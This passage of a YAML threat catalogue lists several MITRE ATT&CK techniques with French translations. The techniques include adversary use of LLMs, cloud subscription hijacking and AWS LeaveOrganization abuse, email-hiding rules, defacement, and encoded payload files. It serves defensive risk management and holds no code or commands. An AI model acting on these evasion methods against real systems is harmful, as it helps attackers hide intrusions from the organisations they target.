      tools, such as large language models (LLMs), to aid various techniques during
      targeting. These tools may be used to inform, bolster, and enable a variety
      of malicious tasks including conducting [Reconnaissance](https://attack.mitre.org/tactics/TA0043),
      creating basic scripts, assisting social engineering, and even developing payloads.(Citation:
      MSFT-AI)


      For example, by utilizing a publicly available LLM an adversary is essentially
      outsourcing or automating certain tasks to the tool. Using AI, the adversary
      may draft and generate content in a variety of written languages to be used
      in [Phishing](https://attack.mitre.org/techniques/T1566)/[Phishing for Information](https://attack.mitre.org/techniques/T1598)
      campaigns. The same publicly available tool may further enable vulnerability
      or other offensive research supporting [Develop Capabilities](https://attack.mitre.org/techniques/T1587).
      AI tools may also automate technical tasks by generating, refining, or otherwise
      enhancing (e.g., [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027))
      malicious scripts and payloads.(Citation: OpenAI-CTI)

      https://attack.mitre.org/techniques/T1588/007'
    translations:
      fr:
        name: Intelligence artificielle
        description: "Les adversaires peuvent avoir acc\xE8s \xE0 des outils d\u2019\
          intelligence artificielle g\xE9n\xE9rative, tels que les grands mod\xE8\
          les de langage (LLM), pour faciliter diverses techniques de ciblage. Ces\
          \ outils peuvent \xEAtre utilis\xE9s pour informer, renforcer et permettre\
          \ diverses t\xE2ches malveillantes, notamment la r\xE9alisation de [Reconnaissance](https://attack.mitre.org/tactics/TA0043),\
          \ la cr\xE9ation de scripts de base, l\u2019assistance \xE0 l\u2019ing\xE9\
          nierie sociale et m\xEAme le d\xE9veloppement de charges utiles. (R\xE9\
          f\xE9rence : MSFT-AI)\n\nPar exemple, en utilisant un LLM accessible au\
          \ public, un adversaire externalise ou automatise essentiellement certaines\
          \ t\xE2ches \xE0 l\u2019outil. \xC0 l\u2019aide de l\u2019IA, l\u2019adversaire\
          \ peut r\xE9diger et g\xE9n\xE9rer du contenu dans diverses langues \xE9\
          crites \xE0 utiliser dans les campagnes [d\u2019hame\xE7onnage](https://attack.mitre.org/techniques/T1566)/[d\u2019\
          hame\xE7onnage \xE0 titre d\u2019information](https://attack.mitre.org/techniques/T1598).\
          \ Le m\xEAme outil accessible au public peut permettre d\u2019autres recherches\
          \ sur les vuln\xE9rabilit\xE9s ou d\u2019autres recherches offensives soutenant\
          \ [D\xE9velopper des capacit\xE9s](https://attack.mitre.org/techniques/T1587).\
          \ Les outils d\u2019IA peuvent \xE9galement automatiser des t\xE2ches techniques\
          \ en g\xE9n\xE9rant, affinant ou am\xE9liorant de toute autre mani\xE8re\
          \ (par exemple, [Fichiers ou informations obfusqu\xE9s](https://attack.mitre.org/techniques/T1027))\
          \ des scripts et des charges utiles malveillants. (Citation : OpenAI-CTI)\n\
          https://attack.mitre.org/techniques/T1588/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1666
    ref_id: T1666
    name: Modify Cloud Resource Hierarchy
    description: "Adversaries may attempt to modify hierarchical structures in infrastructure-as-a-service\
      \ (IaaS) environments in order to evade defenses.  \n\nIaaS environments often\
      \ group resources into a hierarchy, enabling improved resource management and\
      \ application of policies to relevant groups. Hierarchical structures differ\
      \ among cloud providers. For example, in AWS environments, multiple accounts\
      \ can be grouped under a single organization, while in Azure environments, multiple\
      \ subscriptions can be grouped under a single management group.(Citation: AWS\
      \ Organizations)(Citation: Microsoft Azure Resources)\n\nAdversaries may add,\
      \ delete, or otherwise modify resource groups within an IaaS hierarchy. For\
      \ example, in Azure environments, an adversary who has gained access to a Global\
      \ Administrator account may create new subscriptions in which to deploy resources.\
      \ They may also engage in subscription hijacking by transferring an existing\
      \ pay-as-you-go subscription from a victim tenant to an adversary-controlled\
      \ tenant. This will allow the adversary to use the victim\u2019s compute resources\
      \ without generating logs on the victim tenant.(Citation: Microsoft Peach Sandstorm\
      \ 2023)(Citation: Microsoft Subscription Hijacking 2022)\n\nIn AWS environments,\
      \ adversaries with appropriate permissions in a given account may call the `LeaveOrganization`\
      \ API, causing the account to be severed from the AWS Organization to which\
      \ it was tied and removing any Service Control Policies, guardrails, or restrictions\
      \ imposed upon it by its former Organization. Alternatively, adversaries may\
      \ call the `CreateAccount` API in order to create a new account within an AWS\
      \ Organization. This account will use the same payment methods registered to\
      \ the payment account but may not be subject to existing detections or Service\
      \ Control Policies.(Citation: AWS RE:Inforce Threat Detection 2024)\nhttps://attack.mitre.org/techniques/T1666"
    translations:
      fr:
        name: "Modifier la hi\xE9rarchie des ressources cloud"
        description: "Les adversaires peuvent tenter de modifier les structures hi\xE9\
          rarchiques dans les environnements d\u2019infrastructure en tant que service\
          \ (IaaS) afin d\u2019\xE9chapper aux d\xE9fenses.  \n\nLes environnements\
          \ IaaS regroupent souvent les ressources dans une hi\xE9rarchie, ce qui\
          \ permet d\u2019am\xE9liorer la gestion des ressources et l\u2019application\
          \ des politiques aux groupes concern\xE9s. Les structures hi\xE9rarchiques\
          \ diff\xE8rent d\u2019un fournisseur de cloud \xE0 l\u2019autre. Par exemple,\
          \ dans les environnements AWS, plusieurs comptes peuvent \xEAtre regroup\xE9\
          s sous une seule organisation, tandis que dans les environnements Azure,\
          \ plusieurs abonnements peuvent \xEAtre regroup\xE9s sous un seul groupe\
          \ de gestion. (R\xE9f\xE9rence : AWS Organizations)(Citation : Ressources\
          \ Microsoft Azure)\n\nLes adversaires peuvent ajouter, supprimer ou modifier\
          \ des groupes de ressources au sein d\u2019une hi\xE9rarchie IaaS. Par exemple,\
          \ dans les environnements Azure, un adversaire qui a obtenu l\u2019acc\xE8\
          s \xE0 un compte d\u2019administrateur g\xE9n\xE9ral peut cr\xE9er des abonnements\
          \ dans lesquels d\xE9ployer des ressources. Ils peuvent \xE9galement se\
          \ livrer au d\xE9tournement d\u2019abonnement en transf\xE9rant un abonnement\
          \ \xE0 l\u2019utilisation existant d\u2019un locataire victime \xE0 un locataire\
          \ contr\xF4l\xE9 par l\u2019adversaire. Cela permettra \xE0 l\u2019adversaire\
          \ d\u2019utiliser les ressources de calcul de la victime sans g\xE9n\xE9\
          rer de journaux sur le locataire victime. (Citation : Microsoft Peach Sandstorm\
          \ 2023)(Citation : D\xE9tournement d\u2019abonnement Microsoft 2022)\n\n\
          Dans les environnements AWS, les adversaires disposant des autorisations\
          \ appropri\xE9es dans un compte donn\xE9 peuvent appeler l\u2019API \xAB\
          \ LeaveOrganization \xBB, ce qui entra\xEEne la s\xE9paration du compte\
          \ de l\u2019organisation AWS \xE0 laquelle il \xE9tait li\xE9 et supprime\
          \ toutes les politiques de contr\xF4le de service, les garde-fous ou les\
          \ restrictions qui lui sont impos\xE9s par son ancienne organisation. Les\
          \ adversaires peuvent \xE9galement appeler l\u2019API \xAB CreateAccount\
          \ \xBB afin de cr\xE9er un nouveau compte au sein d\u2019une organisation\
          \ AWS. Ce compte utilisera les m\xEAmes m\xE9thodes de paiement que celles\
          \ enregistr\xE9es sur le compte de paiement, mais ne sera peut-\xEAtre pas\
          \ soumis aux d\xE9tections ou aux politiques de contr\xF4le de service existantes.\
          \ (R\xE9f\xE9rence : AWS RE\_:Inforce Threat Detection 2024)\nhttps://attack.mitre.org/techniques/T1666"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1564.008
    ref_id: T1564.008
    name: Email Hiding Rules
    description: 'Adversaries may use email rules to hide inbound emails in a compromised
      user''s mailbox. Many email clients allow users to create inbox rules for various
      email functions, including moving emails to other folders, marking emails as
      read, or deleting emails. Rules may be created or modified within email clients
      or through external features such as the <code>New-InboxRule</code> or <code>Set-InboxRule</code>
      [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets on Windows
      systems.(Citation: Microsoft Inbox Rules)(Citation: MacOS Email Rules)(Citation:
      Microsoft New-InboxRule)(Citation: Microsoft Set-InboxRule)


      Adversaries may utilize email rules within a compromised user''s mailbox to
      delete and/or move emails to less noticeable folders. Adversaries may do this
      to hide security alerts, C2 communication, or responses to [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)
      emails sent from the compromised account.


      Any user or administrator within the organization (or adversary with valid credentials)
      may be able to create rules to automatically move or delete emails. These rules
      can be abused to impair/delay detection had the email content been immediately
      seen by a user or defender. Malicious rules commonly filter out emails based
      on key words (such as <code>malware</code>, <code>suspicious</code>, <code>phish</code>,
      and <code>hack</code>) found in message bodies and subject lines. (Citation:
      Microsoft Cloud App Security)


      In some environments, administrators may be able to enable email rules that
      operate organization-wide rather than on individual inboxes. For example, Microsoft
      Exchange supports transport rules that evaluate all mail an organization receives
      against user-specified conditions, then performs a user-specified action on
      mail that adheres to those conditions.(Citation: Microsoft Mail Flow Rules 2023)
      Adversaries that abuse such features may be able to automatically modify or
      delete all emails related to specific topics (such as internal security incident
      notifications).

      https://attack.mitre.org/techniques/T1564/008'
    translations:
      fr:
        name: "R\xE8gles de masquage des e-mails"
        description: "Les adversaires peuvent utiliser des r\xE8gles de messagerie\
          \ pour masquer les e-mails entrants dans la bo\xEEte aux lettres d\u2019\
          un utilisateur compromis. De nombreux clients de messagerie permettent aux\
          \ utilisateurs de cr\xE9er des r\xE8gles de bo\xEEte de r\xE9ception pour\
          \ diverses fonctions de messagerie, notamment le d\xE9placement des e-mails\
          \ vers d\u2019autres dossiers, le marquage des e-mails comme lus ou la suppression\
          \ d\u2019e-mails. Les r\xE8gles peuvent \xEAtre cr\xE9\xE9es ou modifi\xE9\
          es dans les clients de messagerie ou par le biais de fonctionnalit\xE9s\
          \ externes telles que les applets de commande <code>New-InboxRule</code>\
          \ ou <code>Set-InboxRule</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
          \ sur les syst\xE8mes Windows. (Citation : R\xE8gles de bo\xEEte de r\xE9\
          ception Microsoft)(Citation : R\xE8gles de messagerie MacOS)(Citation :\
          \ Microsoft New-InboxRule)(Citation : Microsoft Set-InboxRule)\n\nLes adversaires\
          \ peuvent utiliser des r\xE8gles de messagerie dans la bo\xEEte aux lettres\
          \ d\u2019un utilisateur compromis pour supprimer et/ou d\xE9placer des e-mails\
          \ vers des dossiers moins visibles. Les adversaires peuvent le faire pour\
          \ masquer les alertes de s\xE9curit\xE9, les communications C2 ou les r\xE9\
          ponses aux e-mails [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)\
          \ envoy\xE9s \xE0 partir du compte compromis.\n\nTout utilisateur ou administrateur\
          \ au sein de l\u2019organisation (ou tout adversaire disposant d\u2019informations\
          \ d\u2019identification valides) peut \xEAtre en mesure de cr\xE9er des\
          \ r\xE8gles pour d\xE9placer ou supprimer automatiquement les e-mails. Ces\
          \ r\xE8gles peuvent \xEAtre utilis\xE9es de mani\xE8re abusive pour alt\xE9\
          rer ou retarder la d\xE9tection si le contenu de l\u2019e-mail avait \xE9\
          t\xE9 imm\xE9diatement vu par un utilisateur ou un d\xE9fenseur. Les r\xE8\
          gles malveillantes filtrent g\xE9n\xE9ralement les e-mails en fonction de\
          \ mots cl\xE9s (tels que <code>logiciel malveillant</code>, <code>suspect,</code>\
          \ <code>hame\xE7onnage</code> et <code>piratage</code>) trouv\xE9s dans\
          \ le corps des messages et les lignes d\u2019objet. (Citation : S\xE9curit\xE9\
          \ des applications cloud Microsoft)\n\nDans certains environnements, les\
          \ administrateurs peuvent \xEAtre en mesure d\u2019activer des r\xE8gles\
          \ de messagerie qui s\u2019appliquent \xE0 l\u2019ensemble de l\u2019organisation\
          \ plut\xF4t qu\u2019aux bo\xEEtes de r\xE9ception individuelles. Par exemple,\
          \ Microsoft Exchange prend en charge les r\xE8gles de transport qui \xE9\
          valuent tous les messages qu\u2019une organisation re\xE7oit par rapport\
          \ aux conditions sp\xE9cifi\xE9es par l\u2019utilisateur, puis effectuent\
          \ une action sp\xE9cifi\xE9e par l\u2019utilisateur sur les messages qui\
          \ respectent ces conditions. (Citation : R\xE8gles de flux de messagerie\
          \ Microsoft 2023) Les adversaires qui abusent de ces fonctionnalit\xE9s\
          \ peuvent \xEAtre en mesure de modifier ou de supprimer automatiquement\
          \ tous les e-mails li\xE9s \xE0 des sujets sp\xE9cifiques (tels que les\
          \ notifications d\u2019incidents de s\xE9curit\xE9 internes).\nhttps://attack.mitre.org/techniques/T1564/008"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1491.002
    ref_id: T1491.002
    name: External Defacement
    description: "An adversary may deface systems external to an organization in an\
      \ attempt to deliver messaging, intimidate, or otherwise mislead an organization\
      \ or users. [External Defacement](https://attack.mitre.org/techniques/T1491/002)\
      \ may ultimately cause users to distrust the systems and to question/discredit\
      \ the system\u2019s integrity. Externally-facing websites are a common victim\
      \ of defacement; often targeted by adversary and hacktivist groups in order\
      \ to push a political message or spread propaganda.(Citation: FireEye Cyber\
      \ Threats to Media Industries)(Citation: Kevin Mandia Statement to US Senate\
      \ Committee on Intelligence)(Citation: Anonymous Hackers Deface Russian Govt\
      \ Site) [External Defacement](https://attack.mitre.org/techniques/T1491/002)\
      \ may be used as a catalyst to trigger events, or as a response to actions taken\
      \ by an organization or government. Similarly, website defacement may also be\
      \ used as setup, or a precursor, for future attacks such as [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).(Citation:\
      \ Trend Micro Deep Dive Into Defacement)\nhttps://attack.mitre.org/techniques/T1491/002"
    translations:
      fr:
        name: "D\xE9figuration externe"
        description: "Un adversaire peut d\xE9grader des syst\xE8mes externes \xE0\
          \ une organisation dans le but de diffuser des messages, d\u2019intimider\
          \ ou d\u2019induire en erreur une organisation ou des utilisateurs. [D\xE9\
          figuration externe](https://attack.mitre.org/techniques/T1491/002) peut\
          \ finalement amener les utilisateurs \xE0 se m\xE9fier des syst\xE8mes et\
          \ \xE0 remettre en question/discr\xE9diter l\u2019int\xE9grit\xE9 du syst\xE8\
          me. Les sites Web externes sont souvent victimes de la d\xE9figuration ;\
          \ Souvent pris pour cible par des groupes d\u2019adversaires et d\u2019\
          hacktivistes afin de faire passer un message politique ou de diffuser de\
          \ la propagande. (Citation : Cybermenaces de FireEye pour les industries\
          \ des m\xE9dias)(Citation : D\xE9claration de Kevin Mandia devant la Commission\
          \ du renseignement du S\xE9nat am\xE9ricain)(Citation\_: Des pirates anonymes\
          \ d\xE9figurent le site du gouvernement russe) [D\xE9figuration externe](https://attack.mitre.org/techniques/T1491/002)\
          \ peuvent \xEAtre utilis\xE9s comme catalyseur pour d\xE9clencher des \xE9\
          v\xE9nements ou en r\xE9ponse \xE0 des mesures prises par une organisation\
          \ ou un gouvernement. De m\xEAme, la d\xE9figuration d\u2019un site Web\
          \ peut \xE9galement \xEAtre utilis\xE9e comme configuration ou pr\xE9curseur\
          \ d\u2019attaques futures telles que [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).\
          \ (Citation : Trend Micro Deep Dive into Defigurement)\nhttps://attack.mitre.org/techniques/T1491/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.013
    ref_id: T1027.013
    name: Encrypted/Encoded File
    description: "Adversaries may encrypt or encode files to obfuscate strings, bytes,\
      \ and other specific patterns to impede detection. Encrypting and/or encoding\
      \ file content aims to conceal malicious artifacts within a file used in an\
      \ intrusion. Many other techniques, such as [Software Packing](https://attack.mitre.org/techniques/T1027/002),\
      \ [Steganography](https://attack.mitre.org/techniques/T1027/003), and [Embedded\
      \ Payloads](https://attack.mitre.org/techniques/T1027/009), share this same\
      \ broad objective. Encrypting and/or encoding files could lead to a lapse in\
      \ detection of static signatures, only for this malicious content to be revealed\
      \ (i.e., [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140))\
      \ at the time of execution/use.\n\nThis type of file obfuscation can be applied\
      \ to many file artifacts present on victim hosts, such as malware log/configuration\
      \ and payload files.(Citation: File obfuscation) Files can be encrypted with\
      \ a hardcoded or user-supplied key, as well as otherwise obfuscated using standard\
      \ encoding/compression schemes such as Base64.\n\nThe entire content of a file\
      \ may be obfuscated, or just specific functions or values (such as C2 addresses).\
      \ Encryption and encoding may also be applied in redundant layers for additional\
      \ protection.\n\nFor example, adversaries may abuse password-protected Word\
      \ documents or self-extracting (SFX) archives as a method of encrypting/encoding\
      \ a file such as a [Phishing](https://attack.mitre.org/techniques/T1566) payload.\
      \ These files typically function by attaching the intended archived content\
      \ to a decompressor stub that is executed when the file is invoked (e.g., [User\
      \ Execution](https://attack.mitre.org/techniques/T1204)).(Citation: SFX - Encrypted/Encoded\
      \ File) \n\nAdversaries may also abuse file-specific as well as custom encoding\
      \ schemes. For example, Byte Order Mark (BOM) headers in text files may be abused\
      \ to manipulate and obfuscate file content until [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)\
      \ execution.\nhttps://attack.mitre.org/techniques/T1027/013"
    translations:
      fr:
        name: "Fichier crypt\xE9/encod\xE9"
        description: "Les adversaires peuvent chiffrer ou encoder des fichiers pour\
          \ masquer des cha\xEEnes, des octets et d\u2019autres motifs sp\xE9cifiques\
          \ afin d\u2019entraver la d\xE9tection. Le chiffrement et/ou l\u2019encodage\
          \ du contenu d\u2019un fichier visent \xE0 dissimuler des artefacts malveillants\
          \ dans un fichier utilis\xE9 dans une intrusion. De nombreuses autres techniques,\
          \ telles que le [Software Packing](https://attack.mitre.org/techniques/T1027/002),\
          \ la [Steganographie](https://attack.mitre.org/techniques/T1027/003) et\
          \ les [Embedded Payloads](https://attack.mitre.org/techniques/T1027/009),\
          \ partagent le m\xEAme objectif g\xE9n\xE9ral. Le chiffrement et/ou l\u2019\
          encodage des fichiers peuvent entra\xEEner une d\xE9faillance de la d\xE9\
          tection des signatures statiques, mais ce contenu malveillant n\u2019est\
          \ r\xE9v\xE9l\xE9 (c\u2019est-\xE0-dire [D\xE9brouiller/D\xE9coder des fichiers\
          \ ou des informations](https://attack.mitre.org/techniques/T1140)) au moment\
          \ de l\u2019ex\xE9cution/de l\u2019utilisation.\n\nCe type d\u2019obfuscation\
          \ de fichiers peut \xEAtre appliqu\xE9 \xE0 de nombreux artefacts de fichiers\
          \ pr\xE9sents sur les h\xF4tes victimes, tels que les fichiers de journal/configuration\
          \ de logiciels malveillants et les fichiers de charge utile. (Citation :\
          \ Obscurcissement de fichier) Les fichiers peuvent \xEAtre chiffr\xE9s \xE0\
          \ l\u2019aide d\u2019une cl\xE9 cod\xE9e en dur ou fournie par l\u2019utilisateur,\
          \ ainsi que masqu\xE9s \xE0 l\u2019aide de sch\xE9mas d\u2019encodage/compression\
          \ standard tels que Base64.\n\nL\u2019int\xE9gralit\xE9 du contenu d\u2019\
          un fichier peut \xEAtre obscurcie, ou seulement des fonctions ou des valeurs\
          \ sp\xE9cifiques (telles que les adresses C2). Le chiffrement et l\u2019\
          encodage peuvent \xE9galement \xEAtre appliqu\xE9s dans des couches redondantes\
          \ pour une protection suppl\xE9mentaire.\n\nPar exemple, les adversaires\
          \ peuvent abuser de documents Word prot\xE9g\xE9s par mot de passe ou d\u2019\
          archives auto-extractibles (SFX) comme m\xE9thode de chiffrement/encodage\
          \ d\u2019un fichier tel qu\u2019une charge utile [Phishing](https://attack.mitre.org/techniques/T1566).\
          \ Ces fichiers fonctionnent g\xE9n\xE9ralement en attachant le contenu archiv\xE9\
          \ pr\xE9vu \xE0 un stub de d\xE9compresseur qui est ex\xE9cut\xE9 lorsque\
          \ le fichier est appel\xE9 (par exemple, [Ex\xE9cution par l\u2019utilisateur](https://attack.mitre.org/techniques/T1204)).\
          \ (Citation\_: SFX - Fichier crypt\xE9/encod\xE9) \n\nLes adversaires peuvent\
          \ \xE9galement abuser des sch\xE9mas d\u2019encodage sp\xE9cifiques aux\
          \ fichiers ainsi que des sch\xE9mas de codage personnalis\xE9s. Par exemple,\
          \ les en-t\xEAtes BOM (Byte Order Mark) dans les fichiers texte peuvent\
          \ \xEAtre utilis\xE9s de mani\xE8re abusive pour manipuler et obscurcir\
          \ le contenu du fichier jusqu\u2019\xE0 l\u2019ex\xE9cution de [Command\
          \ and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).\n\
          https://attack.mitre.org/techniques/T1027/013"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1590.005
    ref_id: T1590.005
    name: IP Addresses
    description: 'Adversaries may gather the victim''s IP addresses that can be used
      during targeting. Public IP addresses may be allocated to organizations by block,
      or a range of sequential addresses. Information about assigned IP addresses
      may include a variety of details, such as which IP addresses are in use. IP
      addresses may also enable an adversary to derive other details about a victim,
      such as organizational size, physical location(s), Internet service provider,
      and or where/how their publicly-facing infrastructure is hosted.


      Adversaries may gather this information in various ways, such as direct collection
      actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or
      [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information
      about assigned IP addresses may also be exposed to adversaries via online or
      other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation:
      WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information
      may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595)
      or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)),
      establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)
      or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)),
      and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).

      https://attack.mitre.org/techniques/T1590/005'
